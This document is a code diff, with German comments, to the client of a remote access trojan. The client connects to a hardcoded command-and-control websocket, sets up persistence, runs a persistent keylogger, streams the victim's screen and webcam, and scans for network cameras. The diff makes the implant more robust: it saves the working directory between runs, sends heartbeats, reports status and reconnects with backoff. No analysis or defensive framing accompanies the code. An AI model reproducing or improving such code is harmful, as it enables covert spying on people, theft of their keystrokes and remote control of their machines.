@@ -22,6 +22,7 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import tempfile
 import threading
+import time
 
 # --- Konfiguration & Globals ---
 SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
@@ -55,6 +56,32 @@ def get_local_ips():
         logging.warning(f"Fehler beim Abrufen der lokalen IPs: {e}")
         return "Unbekannt"
 
+CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
+
+def save_cwd_state():
+    try:
+        with open(CD_STATE_FILE, "w", encoding="utf-8") as f:
+            f.write(os.getcwd())
+    except Exception:
+        pass
+
+def load_cwd_state():
+    try:
+        if os.path.exists(CD_STATE_FILE):
+            with open(CD_STATE_FILE, "r", encoding="utf-8") as f:
+                path = f.read().strip()
+            if os.path.isdir(path):
+                os.chdir(path)
+    except Exception:
+        pass
+
+def get_free_space_mb(path="."):
+    try:
+        stat = shutil.disk_usage(path)
+        return round(stat.free / (1024 * 1024), 2)
+    except Exception:
+        return "Unbekannt"
+
 def get_system_info():
     try:
         try:
@@ -71,6 +98,7 @@ def get_system_info():
             "Architektur": platform.machine(),
             "Python-Version": platform.python_version(),
             "Arbeitsspeicher (MB)": round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**2), 2) if hasattr(os, 'sysconf') else "Unbekannt",
+            "Freier Speicherplatz (MB)": get_free_space_mb(),
             "Aktuelles Verzeichnis": os.getcwd(),
         }
         return "\n".join(f"{k}: {v}" for k, v in info.items())
@@ -150,6 +178,7 @@ def save_uploaded_file(filename, data_b64):
 def change_directory(path):
     try:
         os.chdir(path)
+        save_cwd_state()
         return f"Verzeichnis gewechselt zu: {os.getcwd()}"
     except Exception as e:
         return f"Fehler beim Wechseln des Verzeichnisses: {e}"
@@ -582,8 +611,23 @@ def shutdown_or_restart(action):
     except Exception as e:
         return f"Fehler beim Ausführen von {action}: {e}"
 
+# --- Heartbeat/Ping ---
+async def heartbeat(ws, interval=60):
+    while True:
+        try:
+            await ws.send(json.dumps({"type": "ping"}))
+        except Exception:
+            break
+        await asyncio.sleep(interval)
+
 # === Hauptlogik: Kommandos ===
 async def process_commands(websocket):
+    async def send_status(msg):
+        try:
+            await websocket.send(json.dumps({"type": "client_log", "level": "info", "msg": msg}))
+        except Exception:
+            pass
+
     while True:
         try:
             message = await websocket.recv()
@@ -596,6 +640,7 @@ async def process_commands(websocket):
             if action == "screenstream_start":
                 print("[Client] Screenstream Start angefordert.")
                 await screen_streamer.start(websocket)
+                await send_status("Screenstream gestartet.")
                 response["type"] = "command_output"
                 response["output"] = "Screen-Streaming gestartet."
                 await websocket.send(json.dumps(response))
@@ -603,8 +648,23 @@ async def process_commands(websocket):
             elif action == "screenstream_stop":
                 print("[Client] Screenstream Stop angefordert.")
                 await screen_streamer.stop()
+                await send_status("Screenstream gestoppt.")
                 response["type"] = "command_output"
                 response["output"] = "Screen-Streaming gestoppt."
+                await websocket.send(json.dumps(response))
+                continue
+            elif action == "webcam_start":
+                await webcam_streamer.start(websocket)
+                await send_status("Webcam-Streaming gestartet.")
+                response["type"] = "command_output"
+                response["output"] = "Webcam-Streaming gestartet."
+                await websocket.send(json.dumps(response))
+                continue
+            elif action == "webcam_stop":
+                await webcam_streamer.stop()
+                await send_status("Webcam-Streaming gestoppt.")
+                response["type"] = "command_output"
+                response["output"] = "Webcam-Streaming gestoppt."
                 await websocket.send(json.dumps(response))
                 continue
             elif action == "control":
@@ -768,18 +828,6 @@ async def process_commands(websocket):
                 cams = scan_network_cameras()
                 response["type"] = "command_output"
                 response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
-            elif action == "webcam_start":
-                await webcam_streamer.start(websocket)
-                response["type"] = "command_output"
-                response["output"] = "Webcam-Streaming gestartet."
-                await websocket.send(json.dumps(response))
-                continue
-            elif action == "webcam_stop":
-                await webcam_streamer.stop()
-                response["type"] = "command_output"
-                response["output"] = "Webcam-Streaming gestoppt."
-                await websocket.send(json.dumps(response))
-                continue
             else:
                 response["status"] = "error"
                 response["error"] = "Unbekannte Aktion"
@@ -798,11 +846,13 @@ async def process_commands(websocket):
             except Exception as e2:
                 print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")
 
-# === Haupt-Entry-Point ===
+# --- Haupt-Entry-Point ---
 async def connect_to_server():
     ensure_persistence()
+    load_cwd_state()
     start_persistent_keylogger()
     send_ntfy_notification()
+    backoff = 5
     while True:
         try:
             async with websockets.connect(SERVER_URI) as websocket:
@@ -823,13 +873,18 @@ async def connect_to_server():
                         }))
                 except Exception as e:
                     logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
+                # Starte Heartbeat
+                asyncio.create_task(heartbeat(websocket, 60))
                 await process_commands(websocket)
+                backoff = 5
         except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
             logging.warning(f"Verbindung verloren: {e}")
-            await asyncio.sleep(10)
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 120)
         except Exception as e:
             logging.error(f"Allgemeiner Fehler: {e}")
-            await asyncio.sleep(10)
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 120)
 
 if __name__ == "__main__":
     asyncio.run(connect_to_server())
